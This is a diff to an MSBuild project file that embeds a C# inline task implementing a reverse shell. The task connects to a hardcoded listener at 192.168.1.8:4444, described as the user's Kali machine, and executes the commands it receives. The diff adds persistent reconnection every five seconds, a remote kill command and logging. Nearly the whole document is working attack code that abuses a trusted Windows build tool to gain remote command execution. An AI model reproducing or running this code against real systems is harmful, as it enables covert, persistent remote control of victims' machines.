@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
 
-  <!-- Define the UsingTask first so MSBuild recognizes it -->
+  <!-- UsingTask must appear before Targets -->
   <UsingTask TaskName="ReverseShell" TaskFactory="CodeTaskFactory"
              AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
     <Task>
@@ -16,55 +16,83 @@ using System.Threading;
 public class ReverseShell : Microsoft.Build.Utilities.Task {
     public override bool Execute() {
         try {
-            StartShell(); // block here so MSBuild waits
+            PersistentLoop();
         } catch (Exception ex) {
-            SafeLog("Execute exception: " + ex.ToString());
+            SafeLog("Execute top-level exception: " + ex.ToString());
         }
         return true;
     }
 
-    private void StartShell() {
+    // Persistent loop: keep trying to connect, reconnect on drop.
+    private void PersistentLoop() {
         string host = "192.168.1.8"; // <-- set your Kali IP
         int port = 4444;             // <-- set your listener port
+        bool stopRequested = false;
 
-        try {
-            using (TcpClient client = new TcpClient()) {
-                client.Connect(host, port);
-                using (NetworkStream stream = client.GetStream()) {
-                    stream.ReadTimeout = 0;
-                    stream.WriteTimeout = 0;
+        while (!stopRequested) {
+            try {
+                SafeLog("Attempting connect to " + host + ":" + port);
+                using (TcpClient client = new TcpClient()) {
+                    client.Connect(host, port);
+                    SafeLog("Connected to " + host + ":" + port);
+                    using (NetworkStream stream = client.GetStream()) {
+                        stream.ReadTimeout = 0;
+                        stream.WriteTimeout = 0;
 
-                    WriteToStream(stream, "=== MSBuild Reverse Shell Connected ===\r\n");
+                        WriteToStream(stream, "=== MSBuild Reverse Shell Connected ===\r\n");
 
-                    while (client.Connected) {
-                        // Prompt
-                        string prompt = "PS " + Directory.GetCurrentDirectory() + "> ";
-                        WriteToStream(stream, prompt);
+                        // Session loop: process commands until disconnect or special kill
+                        while (client.Connected) {
+                            // Prompt
+                            string prompt = "PS " + Directory.GetCurrentDirectory() + "> ";
+                            WriteToStream(stream, prompt);
 
-                        // Read command (blocking)
-                        byte[] buffer = new byte[8192];
-                        int bytesRead = 0;
-                        try {
-                            bytesRead = stream.Read(buffer, 0, buffer.Length);
-                        } catch (IOException) {
-                            Thread.Sleep(100);
-                            continue;
-                        }
+                            byte[] buffer = new byte[8192];
+                            int bytesRead = 0;
+                            try {
+                                bytesRead = stream.Read(buffer, 0, buffer.Length);
+                            } catch (IOException ioe) {
+                                SafeLog("Read IOException: " + ioe.Message);
+                                Thread.Sleep(100);
+                                continue;
+                            }
 
-                        if (bytesRead <= 0) break;
+                            if (bytesRead <= 0) {
+                                SafeLog("Remote closed connection (bytesRead <= 0)");
+                                break;
+                            }
 
-                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).TrimEnd('\0', '\r', '\n');
-                        if (string.IsNullOrWhiteSpace(command)) continue;
-                        if (command.Equals("exit", StringComparison.OrdinalIgnoreCase)) break;
+                            string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).TrimEnd('\0', '\r', '\n');
+                            if (string.IsNullOrWhiteSpace(command)) continue;
 
-                        string result = ExecuteCommand(command);
-                        WriteToStream(stream, result);
-                    }
-                }
+                            // Special admin command to stop MSBuild task entirely
+                            if (command.Equals("kill_msbuild", StringComparison.OrdinalIgnoreCase)) {
+                                WriteToStream(stream, "Terminating MSBuild task per request.\r\n");
+                                stopRequested = true;
+                                break;
+                            }
+
+                            if (command.Equals("exit", StringComparison.OrdinalIgnoreCase)) {
+                                WriteToStream(stream, "Closing connection.\r\n");
+                                break;
+                            }
+
+                            string result = ExecuteCommand(command);
+                            WriteToStream(stream, result);
+                        } // end session loop
+                    } // end using stream
+                } // end using client
+            } catch (Exception ex) {
+                SafeLog("Connection/session exception: " + ex.ToString());
             }
-        } catch (Exception ex) {
-            SafeLog("StartShell exception: " + ex.ToString());
-        }
+
+            if (!stopRequested) {
+                SafeLog("Sleeping 5s before next connection attempt...");
+                Thread.Sleep(5000);
+            }
+        } // end persistent loop
+
+        SafeLog("PersistentLoop exit (stopRequested=" + stopRequested + ")");
     }
 
     private void WriteToStream(NetworkStream stream, string text) {
@@ -107,14 +135,13 @@ public class ReverseShell : Microsoft.Build.Utilities.Task {
         try {
             string path = Path.Combine(Path.GetTempPath(), "msbuild_revshell.log");
             File.AppendAllText(path, DateTime.UtcNow.ToString("o") + " " + text + Environment.NewLine);
-        } catch { }
+        } catch { /* best-effort */ }
     }
 }
       ]]></Code>
     </Task>
   </UsingTask>
 
-  <!-- Targets come after UsingTask -->
   <Target Name="Connect">
     <ReverseShell />
   </Target>
